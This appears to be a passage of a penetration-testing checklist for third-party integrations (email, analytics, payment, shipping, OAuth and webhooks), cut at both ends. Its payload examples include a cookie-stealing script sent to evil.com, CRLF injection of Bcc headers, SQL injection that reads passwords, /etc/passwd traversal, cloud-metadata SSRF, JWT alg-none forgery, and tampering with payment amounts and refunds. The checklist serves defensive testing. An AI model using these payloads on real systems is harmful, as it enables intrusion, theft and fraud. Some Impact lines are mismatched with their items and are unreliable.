**Test Category:** Injection (WSTG-INPV-11) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Email Service Integration

**Test Steps:** 1. Send emails through the integration. 2. Inject CRLF characters in email fields. 3. Add unauthorized headers like Bcc or additional recipients. 4. Check for header injection.

**Expected Result:** Application must sanitize all email fields and strip CRLF characters before passing to the email service.

**Payload Example:**

```
to=user@test.com%0d%0aBcc:attacker@evil.com;subject=Test%0d%0aCc:spy@evil.com;from=admin%0d%0aX-Injected:true
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## INTG-107 — Analytics API Key Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Analytics Tools Integration

**Test Steps:** 1. Search client-side code for analytics API keys and tracking IDs. 2. Check for Google Analytics or Mixpanel or Amplitude or Segment keys. 3. Test if exposed keys allow data access.

**Expected Result:** Application must restrict analytics keys to data collection only and keep data access keys server-side.

**Payload Example:**

```
Search for UA-;G-;MIXPANEL_TOKEN;AMPLITUDE_KEY;SEGMENT_WRITE_KEY in source;test for data read access with found keys
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools;GitLeaks

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-108 — Analytics Data Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Analytics Tools Integration

**Test Steps:** 1. Identify analytics events sent from client-side. 2. Inject malicious data into analytics event properties. 3. Check if injected data appears in analytics dashboards causing XSS or misrepresentation.

**Expected Result:** Application must validate analytics event data on the server-side before forwarding to analytics services.

**Payload Example:**

```
analytics.track('purchase',{product:'<script>alert(1)</script>';amount:'999999'});inject false events
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Browser DevTools;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-109 — Analytics Integration IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Analytics Tools Integration

**Test Steps:** 1. Access own analytics data via integration API. 2. Change account_id or project_id to access other users' analytics. 3. Check if analytics data for other accounts is accessible.

**Expected Result:** Application must enforce access control on analytics data and only allow access to the authenticated user's own analytics.

**Payload Example:**

```
GET /api/analytics/data?account_id=1002;GET /api/analytics/projects/PROJ-2001 with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-110 — Analytics Pixel Tracking Privacy Violation
**Test Category:** Privacy (WSTG-INFO-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Analytics Tools Integration

**Test Steps:** 1. Inspect all analytics tracking on the application. 2. Check for excessive user tracking. 3. Verify consent mechanisms for analytics. 4. Test for tracking before consent is given.

**Expected Result:** Application must obtain user consent before activating analytics tracking and respect do-not-track preferences.

**Payload Example:**

```
Check for analytics scripts loading before cookie consent;verify tracking pixels in emails without disclosure
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Browser DevTools;Ghostery;Privacy Badger

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## INTG-111 — Analytics Configuration Manipulation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Analytics Tools Integration

**Test Steps:** 1. Access analytics integration configuration. 2. Modify tracking parameters or destination accounts. 3. Redirect analytics data to attacker-controlled analytics account.

**Expected Result:** Application must restrict analytics configuration changes to authorized administrators and log all modifications.

**Payload Example:**

```
Change analytics_id=UA-OWN to analytics_id=UA-ATTACKER;modify tracking_endpoint to attacker's server
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-112 — Analytics Data Export SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Analytics Tools Integration

**Test Steps:** 1. If analytics export allows specifying a destination URL set to internal addresses. 2. Trigger export. 3. Check if analytics data is sent to internal services.

**Expected Result:** Application must validate analytics export destinations and restrict to authorized external endpoints only.

**Payload Example:**

```
export_destination=http://169.254.169.254/latest/meta-data/;report_webhook=http://localhost:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## INTG-113 — Analytics Script Injection
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Analytics Tools Integration

**Test Steps:** 1. If custom analytics scripts can be configured inject malicious JavaScript. 2. Check if the injected script executes for all users. 3. Test for stored XSS via analytics configuration.

**Expected Result:** Application must validate and sandbox any custom analytics scripts and restrict script configuration to trusted administrators.

**Payload Example:**

```
custom_analytics_script=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## INTG-114 — Payment Gateway API Key Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Search client-side code for payment gateway secret keys. 2. Check for Stripe secret key or PayPal client secret or Razorpay key_secret. 3. Test if exposed keys allow unauthorized transactions.

**Expected Result:** Application must keep payment gateway secret keys server-side only and only expose publishable or public keys to the client.

**Payload Example:**

```
Search for sk_live_;sk_test_;paypal_secret;razorpay_key_secret;braintree_private_key in source code
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** GitLeaks;TruffleHog;Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-115 — Payment Amount Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Initiate a payment. 2. Intercept the payment request and modify the amount. 3. Change amount to a lower value or zero. 4. Submit and check if payment is processed at the manipulated amount.

**Expected Result:** Application must create payment intents server-side with the correct amount and verify the paid amount matches the order total before confirming.

**Payload Example:**

```
Change amount=9999 to amount=1 in POST /api/payments/create-intent;modify total_amount in checkout request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-116 — Payment Gateway Callback Spoofing
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Identify payment gateway callback or webhook endpoints. 2. Craft spoofed payment success callbacks. 3. Send to the application without proper gateway signature. 4. Check if orders are confirmed without actual payment.

**Expected Result:** Application must verify payment gateway webhook signatures and confirm payment status directly with the gateway before processing orders.

**Payload Example:**

```
POST /api/payments/webhook with spoofed {"status":"success";"amount":100} without valid gateway signature
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## INTG-117 — Payment Gateway IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Access own payment details. 2. Change payment_id or transaction_id to another user's payment. 3. Check if other users' payment information is accessible. 4. Test for refund IDOR.

**Expected Result:** Application must verify ownership before displaying payment details and restrict refund operations to authorized users.

**Payload Example:**

```
GET /api/payments/PAY-2001;GET /api/payments/TXN-2001/receipt;POST /api/payments/PAY-2001/refund with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-118 — Payment Currency Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Initiate a payment. 2. Change the currency parameter to a weaker currency. 3. Check if the payment amount remains the same but in the cheaper currency.

**Expected Result:** Application must enforce currency server-side based on the order and account settings and not accept client-provided currency values.

**Payload Example:**

```
Change currency=USD to currency=VND or currency=IRR while keeping the same numeric amount
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-119 — Payment Gateway Token Reuse
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Complete a payment and capture the payment token or nonce. 2. Attempt to reuse the token for additional purchases. 3. Check if single-use tokens are enforced.

**Expected Result:** Application must ensure payment tokens and nonces are single-use and expire after first use or within a short timeframe.

**Payload Example:**

```
Reuse captured payment_token or payment_nonce in new POST /api/payments/charge request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-120 — Payment Gateway SSRF via Return URL
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. If payment flow includes return or cancel URLs modify these to internal addresses. 2. Complete or cancel payment. 3. Check if the application server follows the redirect to internal services.

**Expected Result:** Application must validate return and cancel URLs against allowlists and only allow redirects to application-owned domains.

**Payload Example:**

```
return_url=http://169.254.169.254/latest/meta-data/;cancel_url=http://localhost:8080/admin;callback=http://10.0.0.1/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## INTG-121 — Payment Refund Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Request a refund. 2. Intercept the refund request. 3. Modify refund_amount to exceed the original payment. 4. Check if over-refund is processed.

**Expected Result:** Application must validate refund amounts server-side against original transaction amounts and reject refunds exceeding the paid amount.

**Payload Example:**

```
Change refund_amount=50.00 to refund_amount=5000.00;modify refund to exceed original payment_amount
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-122 — Payment Gateway Credential Rotation Failure
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Check if payment gateway credentials can be rotated. 2. Rotate credentials. 3. Test if old credentials still work. 4. Verify credential storage security.

**Expected Result:** Application must support payment credential rotation and immediately invalidate old credentials upon rotation.

**Payload Example:**

```
Rotate gateway API key then test old_key for continued acceptance;check for hardcoded credentials
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Manual Review

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## INTG-123 — Payment Method Injection
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Select a payment method. 2. Intercept and change payment_method_id to a different method. 3. Try using another user's stored payment method. 4. Check for authorization.

**Expected Result:** Application must verify ownership of payment methods and validate payment method selection server-side.

**Payload Example:**

```
Change payment_method_id to another user's stored card;modify method_type=free_trial for paid order
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-124 — Payment Gateway Test Mode in Production
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Check if test or sandbox payment credentials are used in production. 2. Attempt test card numbers in production. 3. Verify environment separation.

**Expected Result:** Application must use production payment credentials in production and never accept test card numbers or sandbox modes.

**Payload Example:**

```
Use Stripe test card 4242424242424242 in production;check for sk_test_ prefix in API calls
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Postman

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## INTG-125 — Race Condition on Payment Processing
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Payment Gateway Integration

**Test Steps:** 1. Initiate multiple simultaneous payment requests for the same order. 2. Check if multiple charges are created. 3. Verify idempotency in payment processing.

**Expected Result:** Application must implement idempotent payment processing to prevent duplicate charges from concurrent requests.

**Payload Example:**

```
Send 20 concurrent POST /api/payments/charge for same order_id simultaneously
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## INTG-126 — Shipping API Key Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shipping Provider Integration

**Test Steps:** 1. Search client-side code for shipping provider API keys. 2. Check for FedEx or UPS or DHL or USPS credentials. 3. Test if exposed keys allow unauthorized shipment creation.

**Expected Result:** Application must keep shipping provider API keys server-side and never expose them in client-accessible code.

**Payload Example:**

```
Search for fedex_key;ups_access_key;dhl_api_key;usps_user_id;easypost_api_key in JavaScript and config files
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** GitLeaks;TruffleHog;Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-127 — Shipping Rate Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shipping Provider Integration

**Test Steps:** 1. Get shipping rates for an order. 2. Intercept the response and modify shipping rates. 3. Select a premium shipping method at the standard rate. 4. Check if manipulated rates are accepted.

**Expected Result:** Application must retrieve and validate shipping rates server-side at checkout time and not accept client-provided shipping costs.

**Payload Example:**

```
Intercept rate response and change express_shipping_rate=25.00 to express_shipping_rate=0.00;modify rate_id for cheaper rate
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-128 — Shipping Label Generation SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shipping Provider Integration

**Test Steps:** 1. If label generation involves URL parameters modify them to internal addresses. 2. Trigger label generation. 3. Check if internal services are accessed through the label generation process.

**Expected Result:** Application must validate all URLs used in shipping label generation and block access to internal network resources.

**Payload Example:**

```
label_callback=http://169.254.169.254/latest/meta-data/;tracking_webhook=http://localhost:8080/admin
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## INTG-129 — Shipping Provider IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shipping Provider Integration

**Test Steps:** 1. Access shipping details for own order. 2. Change shipment_id or order_id to access another user's shipping information. 3. Check if shipping labels or tracking for other users are accessible.

**Expected Result:** Application must verify order ownership before displaying shipping details or generating shipping labels.

**Payload Example:**

```
GET /api/shipping/labels/SHIP-2001;GET /api/shipping/tracking/SHIP-2001 with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-130 — Shipping Address Manipulation After Label Generation
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Shipping Provider Integration

**Test Steps:** 1. Generate a shipping label for an order. 2. Modify the shipping address after label generation. 3. Check if the package is redirected to the new address without generating a new label.

**Expected Result:** Application must lock the shipping address after label generation and require new label creation for address changes.

**Payload Example:**

```
PUT /api/orders/ORD-1001/shipping-address after POST /api/shipping/labels/generate for same order
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-131 — Shipping Provider Webhook Spoofing
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shipping Provider Integration

**Test Steps:** 1. Identify shipping provider webhook endpoints. 2. Spoof tracking update webhooks from shipping providers. 3. Check if application processes spoofed updates without signature validation.

**Expected Result:** Application must verify shipping provider webhook authenticity through signatures before processing tracking updates.

**Payload Example:**

```
POST /api/shipping/webhooks/tracking with spoofed {"status":"delivered";"tracking_id":"TRACK-1001"} without valid signature
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## INTG-132 — Shipping Weight Manipulation for Rate Evasion
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Shipping Provider Integration

**Test Steps:** 1. Place an order with heavy items. 2. Intercept the shipping rate request. 3. Modify the weight or dimensions parameter to lower values. 4. Check if cheaper rates are applied.

**Expected Result:** Application must calculate shipping weight and dimensions server-side from product data and not accept client-provided values.

**Payload Example:**

```
Change weight=50 to weight=1;modify dimensions from 100x100x100 to 10x10x10 in rate request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-133 — Shipping Provider SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shipping Provider Integration

**Test Steps:** 1. Search or filter shipping records. 2. Inject SQL payloads in tracking number or status filter parameters. 3. Observe response for SQL errors.

**Expected Result:** Application must use parameterized queries for all shipping-related database operations.

**Payload Example:**

```
GET /api/shipping?tracking=' OR 1=1--;GET /api/shipping?status=shipped' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-134 — Shipping Insurance Amount Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Shipping Provider Integration

**Test Steps:** 1. Add shipping insurance to an order. 2. Intercept the request and modify insurance_value or insurance_cost. 3. Get high insurance coverage at low cost.

**Expected Result:** Application must calculate shipping insurance costs server-side based on declared value and carrier rates.

**Payload Example:**

```
Change insurance_value=10000&insurance_cost=1.00 to get $10000 coverage for $1
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-135 — Shipping Label Download Path Traversal
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Shipping Provider Integration

**Test Steps:** 1. Download a shipping label. 2. Modify the file path parameter in the download request. 3. Attempt to read arbitrary server files through the label download.

**Expected Result:** Application must validate label file paths and restrict access to authorized label files only.

**Payload Example:**

```
GET /api/shipping/labels/download?file=../../../etc/passwd;file=....//....//app/config/database.yml
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;Postman

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## INTG-136 — API Key JWT Manipulation
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. If API keys are JWT tokens decode and modify the payload. 2. Change algorithm to none. 3. Modify user_id or permissions claims. 4. Submit with tampered token.

**Expected Result:** Application must validate JWT API key signatures server-side and reject tokens with algorithm downgrade or modified claims.

**Payload Example:**

```
Change JWT alg to none;modify sub claim;add admin:true;change permissions to all
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** Burp Suite;jwt_tool

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## INTG-137 — API Key IP Restriction Bypass
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. If API keys have IP restrictions check enforcement. 2. Modify X-Forwarded-For or X-Real-IP headers. 3. Check if IP restrictions can be bypassed through header manipulation.

**Expected Result:** Application must validate source IP from the actual connection and not trust client-provided IP headers for API key restrictions.

**Payload Example:**

```
Add X-Forwarded-For: ALLOWED_IP;X-Real-IP: ALLOWED_IP;X-Client-IP: ALLOWED_IP to bypass IP restrictions
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-138 — Webhook URL Redirect Chain SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Set webhook URL to an external server that redirects to internal addresses. 2. Trigger the webhook. 3. Check if the application follows redirects to internal services.

**Expected Result:** Application must not follow redirects from webhook URLs or must re-validate the final destination against the allowlist after redirects.

**Payload Example:**

```
webhook_url=https://attacker.com/redirect?to=http://169.254.169.254/ (external redirecting to internal)
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator;Custom Server

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## INTG-139 — Webhook Content-Type Manipulation
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Check what Content-Type the application uses for webhook delivery. 2. If configurable change to unexpected types. 3. Test for parser confusion or injection through content type changes.

**Expected Result:** Application must use a consistent and secure Content-Type for webhook deliveries and validate content type on incoming webhooks.

**Payload Example:**

```
Change webhook content_type from application/json to text/xml with XXE;application/x-www-form-urlencoded with parameter pollution
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-140 — OAuth Token Exchange SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. During OAuth token exchange modify the token endpoint URL if configurable. 2. Set to internal service. 3. Check if the application makes requests to the modified endpoint.

**Expected Result:** Application must hardcode token exchange endpoints to known OAuth provider URLs and not allow client modification.

**Payload Example:**

```
Modify token_endpoint to http://169.254.169.254/latest/meta-data/ in OAuth configuration
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## INTG-141 — OAuth Consent Screen Clickjacking
**Test Category:** Clickjacking (WSTG-CLNT-09) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. Frame the OAuth consent screen. 2. Overlay invisible buttons to trick users into granting permissions. 3. Check if consent page can be iframed.

**Expected Result:** Application must implement X-Frame-Options DENY on OAuth consent screens to prevent clickjacking attacks.

**Payload Example:**

```
<iframe src='https://target.com/oauth/authorize?client_id=APP-1001&scope=admin' style='opacity:0'></iframe>
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite;Browser

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## INTG-142 — Third-party Integration Mass Assignment
